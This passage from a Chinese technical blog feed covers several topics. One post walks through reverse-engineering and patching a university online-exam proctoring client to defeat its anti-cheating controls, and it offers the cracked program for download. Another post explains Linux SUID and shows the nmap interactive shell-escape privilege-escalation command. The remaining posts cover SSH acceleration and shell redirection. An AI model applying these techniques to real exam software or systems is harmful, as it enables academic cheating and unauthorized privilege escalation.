				<span class="nx">log</span><span class="p">.</span><span class="nf">Println</span><span class="p">(</span><span class="s">&#34;write close:&#34;</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
				<span class="k">return</span>
			<span class="p">}</span>
			<span class="k">select</span> <span class="p">{</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">done</span><span class="p">:</span>
			<span class="k">case</span> <span class="o">&lt;-</span><span class="nx">time</span><span class="p">.</span><span class="nf">After</span><span class="p">(</span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span><span class="p">):</span>
			<span class="p">}</span>
			<span class="k">return</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>可能是360也发现这个dos了，过了不到一个周便修复了，增加了评论速率的限制</p>
]]></description></item><item><title>逆向破解学校在线考试客户端</title><link>https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/</link><pubDate>Fri, 01 May 2020 21:44:54 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/security/reverse/crack-sdu-online-exam-software/</guid><description><![CDATA[<h2 id="前言">前言</h2>
<p>近期，学校开始测试线上考试系统，据说十分流氓，开搞！</p>
<p>从大一学弟那里拿到了相关程序和说明文档，经过学弟的使用体验，程序开始运行会自动杀死QQ、微信等程序，隐藏并屏蔽任务栏和开始菜单，强制全屏并屏蔽一些常用的快捷键包括窗口切换等。</p>
<h2 id="开搞">开搞</h2>
<h3 id="基本信息">基本信息</h3>
<p>在虚拟机里安装程序后，先观察一下安装目录结构和里面的文件</p>
<p></p>
<p>仔细查看了各个文件夹下的内容，最终得出结论，是个QT编写的套壳浏览器，用的 QtWebEngine</p>
<p>查看主程序的信息，32位未加壳C++程序，本身非常小，只有不到1M，大部分功能应该都是调库实现的</p>
<p></p>
<p>下面开始逆向，拖入IDA 32位，自动定位到入口函数start，从执行流图中可以看到程序本身结构非常简单</p>
<h3 id="正着走">正着走</h3>
<p>下面从start开始分析</p>
<p></p>
<p>可以看到一开始start函数的栈指针分析就出问题了，但是start本身的调用非常简单，不妨来看一下
首先是 第一个call指令，进入这个函数</p>
<p></p>
<p>发现是 security_cookie检查，没有什么实际作用</p>
<p>第二个是个无条件跳转 jmp，进去看一下</p>
<p></p>
<p>可以看到这一段东西比较多，特别是各种不知道什么作用的call非常多，并且自动反编译出问题了，这个反编译问题应该是比较好解决的，我没有深究</p>
<p>简单看了一下调用的call，越深入越复杂，到这里分析不下去了，东西有点多，从其他方面入手</p>
<h3 id="去除杀进程">去除杀进程</h3>
<p>先来看一下字符串，很幸运字符串没有进行加密，因为我们知道程序会杀死qq，不如直接来搜索关键字QQ</p>
<p></p>
<p>看一下交叉引用</p>
<p></p>
<p>只有一个函数调用了它，先进入看看这个函数，关键部分如下</p>
<p></p>
<p>这就比较清楚了，程序是通过QProcess调用taskkill命令来强制来杀死这些程序的，会被杀死的程序包括实时聊天软件qq、微信，远程协助软件teamviwer、向日葵远程控制。</p>
<p>在这里我们需要去除这个杀死进程的机制，直接将执行的命令字符串给清空就行</p>
<h3 id="去除隐藏任务栏">去除隐藏任务栏</h3>
<p>同时这段命令所在的这个函数在前面还有一堆对QtWebEngine的初始化</p>
<p></p>
<p>这个函数后面的部分有点意思，看到了一些字符串不清楚什么意思</p>
<p></p>
<p>我个人对tray比较敏感，因为做过任务栏图标程序的开发，知道任务栏的英文是tray</p>
<p>这里对 Shell_TrayWhd 进行搜索</p>
<p></p>
<p>发现windows系统有一些特殊的窗口句柄，而这个正式任务栏窗口句柄</p>
<p>一开始我还对这个考试程序怎么隐藏任务栏感兴趣，现在都一目了然了，先通过系统函数获得句柄，然后调用ShowWindow将窗口设置为不显示</p>
<p>这里的ProgMan是任务管理器，所以说这段代码同时屏蔽了任务栏、开始菜单和任务管理器</p>
<p>我们需要去除这种屏蔽机制，这也非常简单，来看汇编</p>
<p></p>
<p>发现在调用showwindow前需要将参数 True or False push入栈，也就是 call ShowWindow前面的push 0，只需要修改这几处汇编即可</p>
<p></p>
<p></p>
<p>将push 0修改为push 1即可去除他的屏蔽(后面的分析知道 push 5 比较好)</p>
<h3 id="去除强制全屏">去除强制全屏</h3>
<p>下面我们来去除一下窗口全屏，虽然有任务栏可以用了，但是全屏会挡住，不好用</p>
<p>还是刚刚那个函数，通过不断查交叉应用，最后定位到start第二次jmp后的代码中</p>
<p></p>
<p>通过前面对前前后后的call和跳转的分析，可以知道没有啥具体内容，所以还得从刚刚的那个函数入手</p>
<p>发现后面有一个call</p>
<p></p>
<p>进入后</p>
<p></p>
<p>发现这个函数是要将之前设置的任务栏隐藏等给还原，所以这里应该是要退出了，重要的内容还是在杀死qq的那些操作和这个函数中间的位置</p>
<p>仔细分析后，找到了关键的地方</p>
<p></p>
<p></p>
<p>这和函数在最后面会获取主屏幕的长和宽，然后调用resize函数设置窗口大小，从而使窗口占满屏幕</p>
<p>这里看一下汇编</p>
<p></p>
<p>其实还是比较难搞的，东西比较紧凑，没法插入太多的汇编，又不想进行大改增加一个call，那就只把开始菜单的地方留出来吧，也就是只修改窗口的高</p>
<p>因为需要先把高入栈，所以前面的宽先存到 esi，我们先不要动这个，先把高减一个数然后push进去再push esi，修改之后如下</p>
<p></p>
<p>这样显示的窗口就不会挡住任务栏，我们就可以切换窗口了</p>
<h3 id="恢复窗口和按钮">恢复窗口和按钮</h3>
<p>后来又想，如果可以手动修改窗口大小就好了，再有个放大、缩小的按钮并且能移动位置就更爽了，那就接着搞</p>
<p>之前做过qt的开发，知道有一个窗口属性是可以隐藏系统窗口，只显示里面的内容从而使窗口无法修改大小和移动位置</p>
<p>搜索一番后发现使用的使 setWindowFlags 函数来实现的，那就从imports里面找一下吧</p>
<p></p>
<p></p>
<p>看交叉引用然后一个一个进去看，最后定位到一个函数，我给他起名 initWindowsComponent，前面的分析我也都相应的进行改名了，分析起来方便记忆</p>
<p></p>
<p>我这个起名应该是非常贴切了，的确是往窗口里面添加各种菜单按钮组件</p>
<p></p>
<p>在后面找到了setWindowFlags调用，但是因为qt里面用的是枚举类型，编译后都变成数字了，只能去看qt的源码</p>
<p></p>
<p>传入的枚举类型使WindowsFlags类型，跟进去后发现又是一个WindowType类型</p>
<p></p>
<p>再接着跟进，就看到了全部的内容</p>
<p></p>
<p>2048换成16进制是0x800

根据代码是无边框类型
</p>
<p>我们需要的是有边框有放大缩小和关闭按钮，所以需要的类型是</p>
<p></p>
<p>此时还没有关闭按钮，根据计算方式，还需要或上关闭按钮的值</p>
<p></p>
<p>修改这个参数后窗口就可以随意移动、修改大小、缩小或者全屏了。</p>
<h3 id="绕过摄像头检查">绕过摄像头检查</h3>
<p>我们还知道这个程序还必须要摄像头检查通过，通过简单的实验，发现摄像头只需要检查通过一次，后面不会重复检查，只会读取device.ini文件，所以我们增加这个文件，并手动指定检查通过</p>
<p></p>
<p>同时通过搜索字符串查看交叉引用可以找到需要读取或者写入文件的地方，这里没有深入研究了，谁敢兴趣谁去研究</p>
<p></p>
<h3 id="其他地方">其他地方</h3>
<p>在对这个程序探究的过程中，还发现了tab栏和menu栏可以打开显示，但是实际作用不大，就没有管。</p>
<p>同时通过burp抓包和测试，找到了在线考试的登录接口并发现普通浏览器可以正常使用</p>
<p>同时通过对相关接口的测试，找到了任意密码修改和个人信息泄露的漏洞</p>
<h2 id="申明与文件">申明与文件</h2>
<p>同时本次研究完全以学习为目的，不得将上述内容用作商业或非法，否则一切后果由用户负责。您必须在下载后的24个小时之内，从您的电脑中彻底删除上述内容。</p>
<p>破解之后的程序 {% asset_link 线上考试.zip [点击下载] %}</p>
]]></description></item><item><title>使用GlobalSSH服务加速境外服务器ssh访问</title><link>https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/</link><pubDate>Sun, 12 Apr 2020 16:37:56 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/coding/use-ucloud-globalssh-to-speedup-server-ssh/</guid><description><![CDATA[<blockquote>
<h3 id="ucloud已经对加速ip进行限制本文中的方法即时失效">UCloud已经对加速IP进行限制，本文中的方法即时失效</h3>
<p>通知内容如下：<br>
尊敬的UCloud用户，您好！<br>
GlobalSSH产品即日起将暂时限制服务器IP地址范围，<br>
仅允许添加UCloud平台上的IP地址，已创建的资源仍然可继续使用。 <br>
GlobalSSH版本与功能支持将持续更新，敬请关注。</p>
</blockquote>
<p>由于众所周知的原因，很多国外的服务器在国内的访问效果很差，特别是国内比较热门的廉价服务器例如 Vultr 就经常被墙直接无法访问</p>
<p>通常情况下我会使用ssr等代理服务进行中转，在我经常使用的 MobaXterm 中设置起来也非常方便</p>
<p></p>
<p>但是这种方法有两大劣势：</p>
<ol>
<li>如果科学上网服务器不稳定经常断流就会导致ssh连接断开</li>
<li>部分客户端不支持设置http或者socks代理</li>
</ol>
<h2 id="globalssh">GlobalSSH</h2>
<p>今天发现了一个免费的加速服务，非常方便，推荐给需要的人</p>
<p>这就是 UCloud 免费提供的 GlobalSSH 加速服务</p>
<p>官网链接： <a href="https://console.ucloud.cn/upathx/globalssh">https://console.ucloud.cn/upathx/globalssh</a></p>
<p>官方文档： <a href="https://docs.ucloud.cn/pathx/globalssh">https://docs.ucloud.cn/pathx/globalssh</a></p>
<p>这项服务目前是免费的，<del>也不需要进行实名认证</del> 现在需要实名认证才能用了，可以说是非常良心了，经过我的试用，访问速度和稳定性非常不错</p>
<p>支持ssh和rdp远程桌面，猜测有一些其他的服务可以加速，因为是针对端口加速的，但是如果滥用的话可能被封禁</p>
<p>在创建的时候只需要输入需要加速的国外服务器的ip和服务端口号，选择一个离服务器近的接入点</p>
<p></p>
<p>创建之后会提供一个域名，可以将自己的域名CNAME解析到提供的域名上方便记忆，UCLOUD可以准确识别到是访问哪一台服务器</p>
<p>在我们使用的客户端上只需要用提供的加速域名和原服务端口号就可以了</p>
<h2 id="注意事项">注意事项</h2>
<ol>
<li>自产品实例创建之日起，7日内单个实例累计出向流量小于2MB，加速功能将被停用，所以一开始先多用点吧</li>
<li>每个源IP只能加速一个端口</li>
<li>加速流量上限官方未注明，滥用的话会被封</li>
</ol>
<h2 id="妙用">妙用</h2>
<p>众所周知，github在国内的访问速度很慢，有时候clone一个库不得不忍受十几k几十k每秒的速度</p>
<p>而git是可以用ssh协议的，所以我们只需要从 <a href="https://api.github.com/meta">https://api.github.com/meta</a> 找到github使用的ip，通过GlobalSSH加速22端口，然后将自己的域名解析到加速的ip，最后使用自己的域名clone就行了</p>
<p>经过我的尝试效果还不错，可以跑到10Mbps</p>
<p>我用的域名为 <code>githubssh.xyz</code> ，大家可以拿去用，使用方法如下：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">原命令
git clone git@github.com:moby/moby.git

替换后
git clone git@githubssh.xyz:moby/moby.git
</code></pre></td></tr></table>
</div>
</div><p>为了能够自动更新ip，我写了一个程序，每天会检查github新的ip，创建新的globalssh，然后自动解析到域名githubssh.xyz上，由cloudflare进行DNS层面的负载均衡</p>
<p>开源地址为： <a href="https://github.com/zu1k/globalssh4github">https://github.com/zu1k/globalssh4github</a></p>
<p>同时为了方便，改了一个插件： <a href="https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo">https://chrome.google.com/webstore/detail/github%E5%8A%A0%E9%80%9F/kejahdakjmkfddgnifodfnpcklckjjpo</a></p>
]]></description></item><item><title>学习Linux中的SUID机制</title><link>https://lgf.im/posts/linux/linux-suid/</link><pubDate>Mon, 30 Mar 2020 11:36:25 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/linux/linux-suid/</guid><description><![CDATA[<h2 id="什么是suid">什么是SUID</h2>
<p>SUID简称位，英文全称是Set owner User ID up on execution，它是一种特殊的文件权限，能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p>
<p>同一类的还有SGID，就不详细说了，原理与SUID一样，就以SUID为例</p>
<p>在一个程序执行的时候会有三个ID状态，在深入学习SUID之前必须能够区分下面三种ID：</p>
<ul>
<li>Real User ID</li>
<li>Effective User ID</li>
<li>Saved User ID</li>
</ul>
<p><code>Real User ID</code> 是执行这个程序的用户的真实ID，是已用户login时候的ID为准</p>
<p><code>Effective User ID</code> 是程序执行过程中使用权限时真正起作用的用户ID，操作系统在检查一个程序有没有某个权限的时候会看这个ID</p>
<p><code>Saved User ID</code> 是程序临时提权时需要保存的先前的用户ID，等提权结束后需要回退到这个用户ID</p>
<h2 id="suid的作用">SUID的作用</h2>
<p>如果用户user2有另一个用户user1的程序的执行权限，并且user1给这个程序设置了SUID位，那么user2就可以用user1的权限来执行这个程序</p>
<p>简单来说，SUID能够让用户(如Bob)用其他用户(如root用户)的权限运行一个程序，而不需要用sudo进行临时提权</p>
<p>举个例子：</p>
<p>所有用户的密码保存在 <code>/etc/shadow</code> 文件中，但是这个文件只有root用户能够进行写操作</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# ls -l /etc/shadow
-rw-r----- <span class="m">1</span> root shadow <span class="m">1639</span> Jan <span class="m">27</span> 12:50 /etc/shadow
</code></pre></td></tr></table>
</div>
</div><p>那如果普通用户想要修改自己的密码，是否需要让root用户帮着修改呢？</p>
<p>显然不需要，修改密码用到了 <code>/usr/bin/passwd</code> 这个程序，我们来看一下它的权限</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@kali:~# ls -l /usr/bin/passwd
-rwsr-xr-x <span class="m">1</span> root root <span class="m">63944</span> Dec <span class="m">20</span> 10:39 /usr/bin/passwd
</code></pre></td></tr></table>
</div>
</div><p>可以看到，这个程序的所有者是root用户，但是所有用户都有执行权限，并且设置了s位（怎么看出来的后面会说）</p>
<p>这样SUID机制就会在程序执行的时候发生作用，让普通用户可以用root权限修改<code>/etc/shadow</code>文件</p>
<p>SUID机制的存在使程序权限的控制更加方便，用户可以执行某个程序而不需要登录到程序拥有者的账号</p>
<h2 id="如何使用suid">如何使用SUID</h2>
<h3 id="查看suid">查看SUID</h3>
<p>通过命令 <code>ls -l</code> 即可看到文件的详细信息，包括权限表 <code>-rwxrwxrwx</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">-   rwx   rwx   rwx

第一位是文件类型，-就是普通文件，d代表目录，l代表链接文件，还有一些其他类型的文件不详细说了

后面的9位可以分成三组，分别表示所有者权限、同组内用户权限，组外其他用户权限

每一组都有三位，r 代表有读取权限，w 代表有写入权限，x 代表有执行权限，如果是 _ 就代表没有相应的权限

如果文件所有者权限的 x 换成 s 就代表设置了SUID

同理如果组内用户权限的 x 换成了 s 就代表设置了SGID
</code></pre></td></tr></table>
</div>
</div><h3 id="设置suid">设置SUID</h3>
<p>使用 <code>chmod 4000 filename</code> 可以设置SUID位</p>
<p>使用 <code>chmod 2000 filename</code> 可以设置SGID位</p>
<p>使用 <code>chmod 6000 filename</code> 可以同时设置SGID和SUID位</p>
<blockquote>
<p>注意: 2000\4000\6000都是不完整的权限，正常使用应该将000替换为相应的权限，例如 4755</p>
</blockquote>
<h3 id="取消suid">取消SUID</h3>
<p>使用 <code>chmod 755 filename</code> 可以取消SGID和SUID位</p>
<p>或者 <code>chmod u-s filename</code> or <code>chmod g-s filename</code> 也可以</p>
<h2 id="suid提权">SUID提权</h2>
<p>因为SUID位让程序在执行的时候有了所有者的权限，所以可以利用这点来提权</p>
<p>示例：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 进入nmap的交互模式</span>
nmap --interactive
<span class="c1"># 执行sh，提权成功</span>
!sh
</code></pre></td></tr></table>
</div>
</div><p>详细介绍见： <a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p>
<h2 id="suid在脚本中失效">SUID在脚本中失效</h2>
<p>假如user1用 <code>chmod 4777 /home/user1/script.sh</code> 命令给<code>script.sh</code>脚本设置SUID位，登录user2后执行这个脚本提示没有权限</p>
<p>这是因为SUID位只对编译过的可执行程序起作用，sh脚本的实际执行程序是sh或者bash之类，如果它们在执行的时候并不会检查脚本文件的SUID位，那就不会起作用了</p>
<p>Perl执行器会检查perl脚本的suid位，所以可以给pl脚本设置suid位</p>
]]></description></item><item><title>Linux Shell中的重定向</title><link>https://lgf.im/posts/linux/redirect-in-shell/</link><pubDate>Tue, 24 Mar 2020 15:50:07 +0000</pubDate><author>作者</author><guid>https://lgf.im/posts/linux/redirect-in-shell/</guid><description><![CDATA[<p>经常会看到别人的shell脚本后面有一个 <code>2&gt;&amp;1</code> ，一直没去深究，今天这个话题就以这个为出发点进行展开，学习一下linux shell中重定向的话题。</p>
<h2 id="特殊的东西">特殊的东西</h2>
<p>先来看一点linux中特殊的东西，为后面的内容打下基础</p>
<h3 id="特殊的文件">特殊的文件</h3>
<ul>
<li><code>/dev/null</code> 空，可以将垃圾内容导入其中，就会消失</li>
<li><code>/dev/zero</code> 零，可以从中读出无穷无尽的0</li>
<li><code>/dev/urandom</code> 随机数，可以从中读出无穷无尽的随机数</li>
<li><code>/dev/stdin</code> 标准输入流</li>
<li><code>/dev/stdout</code> 标准输出流</li>
<li><code>/dev/stderr</code> 标准错误输出流</li>
</ul>
<p>我们可以看到后三个文件其实是个链接，指向内核的文件描述符 0\1\2</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stderr -&gt; /proc/self/fd/2
lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stdin -&gt; /proc/self/fd/0
lrwxrwxrwx <span class="m">1</span> root root         <span class="m">15</span> Mar <span class="m">24</span> 16:20 stdout -&gt; /proc/self/fd/1
</code></pre></td></tr></table>
</div>
</div><h3 id="特殊的文件描述符">特殊的文件描述符</h3>
<p>在Linux shell中有三个特殊的文件描述符（<code>File descriptor</code> or <code>fd</code>）:</p>
<ul>
<li>fd<code>0</code> 是标准输入: <code>stdin</code></li>
<li>fd<code>1</code> 是标准输出: <code>stdout</code></li>
<li>fd<code>2</code> 是标准错误输出: <code>stderr</code></li>
</ul>
<p>通过这三个特殊的文件描述符我们可以控制输入输出流</p>
<h2 id="重定向">重定向</h2>
<p>我们经常会接触到 <code>&gt;</code> 这个符号，叫做重定向，其实还有另一个符号 <code>&gt;&gt;</code> 有着类似的功能，他们之间有一点小区别：</p>
<ul>
<li><code>&gt;</code> 是覆盖的方式</li>
<li><code>&gt;&gt;</code> 是追加的方式</li>
</ul>
<blockquote>
<p>下面的内容将全部以 <code>&gt;</code> 为例，<code>&gt;&gt;</code> 除了内容是追加之外没有其他区别，就不赘述</p>
</blockquote>
<h2 id="使用重定向">使用重定向</h2>
<h3 id="重定向到文件">重定向到文件</h3>
<p>先来看一下最基本的重定向的使用方法，我们将 <code>echo</code> 命令的输出重定向到一个文件中</p>
<p><code>echo &quot;hello&quot; &gt; a.txt</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt; a.txt
root@ubuntu:~# cat a.txt
hello
</code></pre></td></tr></table>
</div>
</div><p>这里是将 <strong>stdout</strong> 重定向到文件 <strong>a.txt</strong> 中，与下面的命令等价</p>
<p><code>echo &quot;hello&quot; 1&gt; a.txt</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# rm a.txt
root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> 1&gt; a.txt
root@ubuntu:~# cat a.txt
hello
</code></pre></td></tr></table>
</div>
</div><p>这里我们看到重定向符号 <code>&gt;</code> 默认是将 <code>stdout</code> 也就是 fd<code>1</code> 重定向到别处</p>
<p>如果我们想要将标准错误输出<code>stderr</code>进行重定向，只需要将上面命令中的文件描述符<code>1</code>修改为标准错误输出的文件描述符<code>2</code>即可</p>
<h3 id="重定向到文件描述符">重定向到文件描述符</h3>
<p>有些情况下 <code>stderr</code> 是会被程序控制写入错误日志的，如果我们想要在命令运行的时候将错误显示在屏幕上，就需要将错误输出重定向到标准输出流中</p>
<p>我们先来尝试一下, 这里我们没有找到一个合适的命令，就拿 <code>ls</code> 命令查看一个不存在的目录，这样会产生错误输出</p>
<blockquote>
<p>这里错误默认是会被输出到屏幕的，只是我暂时没有找到一个更好的程序，我们先假设他不会输出到屏幕</p>
</blockquote>
<p><code>ls error 2&gt;1</code></p>
<p>这里我们的猜想是将 <code>stderr</code> 重定向到 <code>stdout</code>, 所以写了 <code>2&gt;1</code>, 我们来看一下会不会成功？</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls error 2&gt;1
root@ubuntu:~#
root@ubuntu:~# ls
<span class="m">1</span>
root@ubuntu:~# cat <span class="m">1</span>
ls: cannot access <span class="s1">&#39;error&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><p>我们看到了，并没有输出，而是在当前目录下生成了一个文件 <code>1</code>, 这说明如果我们只写 <code>&gt;1</code> 会被当做重定向到文件 <code>1</code> 中</p>
<p>此时，我们的 <code>&amp;</code> 就要上场了</p>
<p><code>&gt;&amp;</code> 是将一个流重定向到一个文件描述符的语法，所以刚刚我们应该指明要重定向到 fd<code>1</code>, 也就是 <code>&amp;1</code></p>
<p><code>ls error 2&gt;&amp;1</code></p>
<p>执行结果：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# ls error 2&gt;<span class="p">&amp;</span><span class="m">1</span>
ls: cannot access <span class="s1">&#39;error&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>到这里我们就可以自主发挥了</p>
</blockquote>
<p>将标准输出重定向到标准错误输出</p>
<p><code>echo &quot;hello&quot; 1&gt;&amp;2</code> or <code>echo &quot;hello&quot; &gt;&amp;2</code></p>
<p>甚至我们可以玩点复杂的</p>
<p><code>(echo &quot;hello&quot; &gt;&amp;9) 9&gt;&amp;2 2&gt;&amp;1</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="o">(</span><span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt;<span class="p">&amp;</span>9<span class="o">)</span> 9&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
hello
</code></pre></td></tr></table>
</div>
</div><p>这里的文件描述符<code>9</code>会自动生成，但是去除括号就会提示错误了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="nb">echo</span> <span class="s2">&#34;hello&#34;</span> &gt;<span class="p">&amp;</span><span class="m">9</span> 9&gt;<span class="p">&amp;</span><span class="m">2</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span>
bash: 9: Bad file descriptor
</code></pre></td></tr></table>
</div>
</div><p>在 bash &gt;4.0 的版本中，又出了新的重定向语法</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">$ ls -ld /tmp /tnt 2&gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> &gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/O: /&#39;</span><span class="o">)</span>
O: drwxrwxrwt <span class="m">17</span> root root <span class="m">28672</span> Nov  <span class="m">5</span> 23:00 /tmp
E: ls: cannot access /tnt: No such file or directory
</code></pre></td></tr></table>
</div>
</div><blockquote>
<p>这种写法我还没有学习，等我后面学会了再进行更新</p>
</blockquote>
<h3 id="格式化输出">格式化输出</h3>
<p>来点高端点的用法</p>
<p>用于格式化输出, 将标准输出和错误输出两个流重定向到不同的处理中，最后汇总</p>
<p><code>((ls -ld /tmp /tnt |sed 's/^/O: /' &gt;&amp;9 ) 2&gt;&amp;1 |sed 's/^/E: /') 9&gt;&amp;1| cat -n</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# <span class="o">((</span>ls -ld /tmp /tnt <span class="p">|</span>sed <span class="s1">&#39;s/^/O: /&#39;</span> &gt;<span class="p">&amp;</span><span class="m">9</span> <span class="o">)</span> 2&gt;<span class="p">&amp;</span><span class="m">1</span> <span class="p">|</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> 9&gt;<span class="p">&amp;</span>1<span class="p">|</span> cat -n
     <span class="m">1</span>  O: drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 18:59 /tmp
     <span class="m">2</span>  E: ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><p>相同作用的新版语法</p>
<p><code>cat -n &lt;(ls -ld /tmp /tnt 2&gt; &gt;(sed 's/^/E: /') &gt; &gt;(sed 's/^/O: /'))</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# cat -n &lt;<span class="o">(</span>ls -ld /tmp /tnt 2&gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/E: /&#39;</span><span class="o">)</span> &gt; &gt;<span class="o">(</span>sed <span class="s1">&#39;s/^/O: /&#39;</span><span class="o">))</span>
     <span class="m">1</span>  O: drwxrwxrwt <span class="m">1</span> root root <span class="m">4096</span> Mar <span class="m">22</span> 18:59 /tmp
     <span class="m">2</span>  E: ls: cannot access <span class="s1">&#39;/tnt&#39;</span>: No such file or directory
</code></pre></td></tr></table>
</div>
</div><h3 id="合并文件">合并文件</h3>
<p>将输出文件 m 和 n 合并: <code>n &gt;&amp; m</code></p>
<p>将输入文件 m 和 n 合并: <code>n &lt;&amp; m</code></p>
<h3 id="输入边界">输入边界</h3>
<p>将开始标记 tag 和结束标记 tag 之间的内容作为输入: <code>&lt;&lt; tag</code></p>
<p>例如：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">root@ubuntu:~# wc -l <span class="s">&lt;&lt; EOF
</span><span class="s">    document line 1
</span><span class="s">    document line 2
</span><span class="s">    document line 3
</span><span class="s">EOF</span>
<span class="m">3</span> //表明收到3行输入
</code></pre></td></tr></table>
</div>
</div><p>它的作用是将两个 EOF 之间的内容(document) 作为输入传递给 command。</p>
